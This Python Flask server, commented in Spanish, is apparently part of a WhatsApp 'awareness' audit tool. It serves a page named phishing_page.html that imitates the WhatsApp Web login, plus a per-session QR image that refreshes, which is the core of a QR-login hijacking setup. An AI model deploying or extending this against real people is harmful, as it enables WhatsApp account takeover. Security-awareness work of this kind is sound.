#!/usr/bin/env python3
"""
Servidor Flask para la interfaz web de concientización y servir imágenes QR dinámicas.
Soporta múltiples sesiones concurrentes con aislamiento de archivos por sesión.
"""

from flask import Flask, render_template, request
from flask.helpers import send_from_directory
from pathlib import Path
import os
import logging

logger = logging.getLogger('WhatsApp-Forensic-Server')

# Directorio base del servidor
BASE_DIR = Path(__file__).parent.resolve()
TEMPLATES_DIR = BASE_DIR / "templates"
EVIDENCE_DIR = Path(__file__).parent.parent / "evidencias"

# Crear aplicación Flask
app = Flask(__name__, template_folder=str(TEMPLATES_DIR))
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # Máximo 16MB para archivos


@app.after_request
def log_http_request(response):
    """Registrar solicitudes HTTP en el archivo sin usar la consola de Werkzeug."""
    logger.debug(
        "[HTTP] %s %s -> %s (%s)",
        request.method,
        request.path,
        response.status_code,
        request.remote_addr,
    )
    return response


@app.route('/demo/<session_id>', methods=['GET'])
def demo_login(session_id):
    """
    Ruta para renderizar la interfaz de login de WhatsApp Web cuasi-real.
    
    Args:
        session_id (str): ID único de la sesión de auditoría
        
    Returns:
        HTML renderizado con script para refrescar el QR cada 3 segundos
    """
    try:
        logger.info(f"[DEMO] Acceso a interfaz de login para sesión: {session_id}")
        return render_template('phishing_page.html')
    except Exception as e:
        logger.error(f"[ERROR] Fallo al renderizar plantilla para {session_id}: {e}")
        return f"Error: No se puede cargar la plantilla - {e}", 500


@app.route('/qr/<session_id>/qr.png', methods=['GET'])
def serve_qr(session_id):
    """
    Ruta para servir la imagen QR dinámicamente desde el sistema de archivos.
    Busca el archivo en ./evidencias/<session_id>/qr.png.
    
    Args:
        session_id (str): ID único de la sesión para localizar el QR
        
    Returns:
        Imagen PNG o error 404/444 si no existe
    """
    try:
        # Construir la ruta segura del archivo QR
        session_dir = EVIDENCE_DIR / str(session_id)
        qr_file = session_dir / "qr.png"
        
        # Validación de seguridad: asegurar que no se sale del directorio base
        qr_file_resolved = qr_file.resolve()
        evidence_dir_resolved = EVIDENCE_DIR.resolve()
        
        if not str(qr_file_resolved).startswith(str(evidence_dir_resolved)):
            logger.warning(f"[SECURITY] Intento de path traversal detectado: {qr_file}")
            return "", 404
        
        # Verificar que el archivo existe
        if not qr_file.exists():
            logger.debug(f"[QR] Archivo no encontrado para sesión {session_id}")
            # Retornar 444 (No Response) o 404 según se prefiera
            return "", 404
        
        logger.debug(f"[QR] Sirviendo imagen QR para sesión {session_id}")
        
        # Servir el archivo desde el directorio
        return send_from_directory(str(session_dir), "qr.png", mimetype='image/png')
        
    except Exception as e:
        logger.error(f"[ERROR] Fallo al servir QR para {session_id}: {e}")
        return "", 404


@app.errorhandler(404)
def handle_404(error):
    """Manejador personalizado para errores 404."""
    return "Recurso no encontrado", 404


@app.errorhandler(500)
def handle_500(error):
    """Manejador personalizado para errores 500."""
    logger.error(f"[ERROR] Error interno del servidor: {error}")
    return "Error interno del servidor", 500


def run_server(host='0.0.0.0', port=8080, debug=False):
    """
    Ejecutar el servidor Flask en modo multihilo.
    
    Args:
        host (str): Interfaz a vincular (0.0.0.0 para todas)
        port (int): Puerto a escuchar
        debug (bool): Modo debug
    """
    logger.info(f"[SERVER] Iniciando servidor en {host}:{port}")
    logger.info(f"[SERVER] Modo multihilo habilitado (threaded=True)")
    logger.info(f"[SERVER] Directorio de evidencias: {EVIDENCE_DIR}")
    logger.info(f"[SERVER] Directorio de plantillas: {TEMPLATES_DIR}")
    
    # Ejecutar servidor con soporte multihilo
    app.run(
        host=host,
        port=port,
        debug=debug,
        threaded=True,  # Habilitar modo multihilo para concurrencia
        use_reloader=False  # Desactivar reloader en entorno de producción
    )




if __name__ == '__main__':
    # Arrancar servidor Flask
    run_server(debug=False)
